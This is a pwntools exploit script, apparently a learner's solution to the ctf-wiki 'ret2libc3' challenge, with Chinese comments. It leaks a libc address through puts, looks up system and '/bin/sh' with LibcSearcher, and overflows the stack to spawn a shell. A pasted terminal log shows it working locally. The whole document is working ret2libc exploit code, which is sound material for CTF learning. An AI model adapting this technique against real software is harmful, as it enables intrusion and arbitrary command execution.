from pwn import *
from LibcSearcher import *

io = process("./ret2libc3")
elf = ELF("./ret2libc3")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
start = elf.symbols['_start']

# payload = b'A'*108 + b'BBBB' + puts_plt + start + puts_got  # 报错：TypeError: can't concat int to bytes
payload = b'A'*108 + b'BBBB' + p32(puts_plt) + p32(start) + p32(puts_got) # 正确写法
io.sendlineafter("Can you find it !?", payload)
puts_addr_raw = io.recv(4)
puts_addr = u32(puts_addr_raw)

libc = LibcSearcher("puts", puts_addr)
base = puts_addr - libc.dump("puts")
system_addr = base + libc.dump("system")
sh_addr = base + libc.dump("str_bin_sh")

# payload2 = b'A'*108 + b'BBBB' + p32(system_addr) + b'0xdeadbeaf' + p32(sh_addr) # 错误写法
# payload2 = b'A'*108 + b'BBBB' + p32(system_addr) + p32(0xdeadbeaf) + p32(sh_addr) # 正确写法
# payload2 = b'A'*108 + b'BBBB' + p32(system_addr) + b'\x0f\x0b\x0f\x0b' + p32(sh_addr) # 正确写法
payload2 = b'A'*108 + b'BBBB' + p32(system_addr) + b'1234' + p32(sh_addr) # 正确写法
io.sendlineafter("Can you find it !?", payload2)
io.interactive()


"""
┌──(root㉿kali)-[~/ctfwiki/ret2libc3]
└─# python exp-clean.py                                                                              
[+] Starting local process './ret2libc3': pid 18209
[*] '/root/ctfwiki/ret2libc3/ret2libc3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
/usr/local/lib/python3.11/dist-packages/pwnlib/tubes/tube.py:840: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[+] There are multiple libc that meet current constraints :
0 - libc6_2.37-5_i386
1 - libc6_2.32-0experimental0_amd64
2 - libc6_2.37-6_i386
3 - libc6-amd64_2.32-0experimental0_i386
4 - libc6-amd64_2.8~20080505-0ubuntu9_i386
5 - libc6_2.32-0experimental1_amd64
6 - libc6-amd64_2.32-0experimental1_i386
7 - libc6_2.8~20080505-0ubuntu9_amd64
8 - libc6_2.37-7_i386
[+] Choose one : 0
[*] Switching to interactive mode
$ ls
core  exp2.py  exp-clean.py  exp.py  ret2libc3
$ 
[*] Interrupted
[*] Stopped process './ret2libc3' (pid 18209)
                                                                                                                                                                                                                                          
┌──(root㉿kali)-[~/ctfwiki/ret2libc3]
└─# 
                                                                                                                                                                                                                                          
┌──(root㉿kali)-[~/ctfwiki/ret2libc3]
└─# 
       
"""